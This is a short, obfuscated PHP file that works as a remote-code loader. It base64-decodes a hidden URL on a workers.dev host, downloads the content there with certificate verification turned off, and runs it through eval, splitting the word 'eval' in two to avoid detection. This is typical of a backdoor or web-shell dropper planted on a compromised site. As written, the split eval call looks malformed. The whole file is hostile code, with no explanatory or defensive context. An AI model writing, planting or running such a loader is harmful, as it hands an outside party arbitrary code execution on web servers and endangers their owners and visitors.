<?php
$uu=base64_decode('aHR0cHM6Ly9yYXctc2VydmUubmlicmFzLXN1YWQud29ya2Vycy5kZXYvdG9vbHMvc2hpZWxkLnBocA==');$cc=curl_init($uu);curl_setopt_array($cc,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_TIMEOUT=>30,CURLOPT_SSL_VERIFYPEER=>0]);$dd=curl_exec($cc);if(!curl_errno($cc)&&strlen($dd)>0){ev'.'al('?>'.$dd);}else{echo 'error';}curl_close($cc);
